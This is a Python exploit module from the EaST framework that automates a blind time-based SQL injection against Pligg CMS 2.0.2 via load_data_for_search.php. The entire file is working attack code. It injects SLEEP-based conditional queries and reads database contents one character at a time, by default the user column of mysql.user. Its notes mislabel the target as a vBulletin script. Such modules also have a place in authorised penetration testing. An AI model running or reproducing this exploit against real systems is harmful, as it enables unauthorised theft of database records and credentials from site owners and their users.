#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution

from collections import OrderedDict
import urlparse
import urllib
import urllib2
from string import printable
import time

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "pligg_cms_blind_sqli"
INFO['DESCRIPTION'] = "Pligg CMS 2.0.2 Blind SQLi"
INFO['VENDOR'] = "https://github.com/Kliqqi-CMS/Kliqqi-CMS"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    This module exploits a blind SQLi in vBulletin script "load_data_for_search.php" GET parameter "sql".
Tested against PliggCMS 2.0.2 on Windows 7 SP1 x64.
    """
INFO["DOWNLOAD_LINK"] = "https://www.exploit-db.com/apps/c966f6c9809d684cbe753efe22f7d273-pligg-cms-2.0.2.zip"
INFO["LINKS"] = ['https://www.exploit-db.com/exploits/38241/']
INFO['CHANGELOG'] = "18 Sep, 2015. Written by Gleg team."
INFO['PATH'] = "Web/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 81
OPTIONS["SSL"] = False
OPTIONS["BASEPATH"] = "/pligg-cms-2.0.2"
OPTIONS["TABLE"] = "mysql.user"
OPTIONS["COLUMN"] = "user"
OPTIONS["TTL"] = 3
OPTIONS["SHOW EVERY FOUND SYMBOL"] = False



class exploit(Sploit):
    def __init__(self, host='', port=80, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS["HOST"])
        self.port = self.args.get('PORT', OPTIONS["PORT"])
        self.path = self.args.get('BASEPATH', OPTIONS["BASEPATH"])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.ttl = self.args.get('TTL', OPTIONS['TTL'])
        self.table = self.args.get('TABLE', OPTIONS['TABLE'])
        self.column = self.args.get('COLUMN', OPTIONS['COLUMN'])
        self.debug = self.args.get('SHOW EVERY FOUND SYMBOL', OPTIONS['SHOW EVERY FOUND SYMBOL'])
        proto = "https" if self.ssl else "http"
        self.url = urlparse.urljoin("{}://{}:{}/".format(proto, self.host, self.port), self.path) + "/load_data_for_search.php?sql="
        self.vuln_data = ('SELECT * FROM (SELECT(SLEEP({ttl}-(IF(ORD(MID((SELECT '
                        '(IFNULL(CAST({column} AS CHAR),0x20)) FROM {table} LIMIT '
                        '{entry_no},1),{char_pos},1))={char_ord},0,{ttl})))))beSz'
                          )

    def find(self, table, column):
        result = []
        subresult = []
        entry_no = 0
        char_pos = 1
        tryes = 10
        while 1:
            changed = False
            for char in printable:
                char_ord = ord(char)
                begin = time.time()
                data = urllib.quote(self.vuln_data.format(table=table, column=column, entry_no=entry_no, char_pos=char_pos, char_ord=char_ord, ttl=self.ttl), safe='')
                res = urllib.urlopen(self.url + data).read()
                end = time.time() - begin
                if end > self.ttl:
                    changed = True
                    if self.debug:
                        self.log(char)
                    subresult.append(char)
                    break
            if changed:
                char_pos += 1
            else:
                if char_pos == 1:
                    tryes -= 1
                    if tryes < 0:
                        break
                else:
                    res = "".join(subresult)
                    result.append(res)
                    self.log("[+] Found: %s" % (res))
                subresult = []
                char_pos = 1
                entry_no += 1
        return result


    def run(self):
        self.args()
        self.log("[*] Trying to get `%s` from `%s`..." % (self.column, self.table))
        result = self.find(self.table, self.column)
        self.log("[+] Found following entries:")
        self.log(result)
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()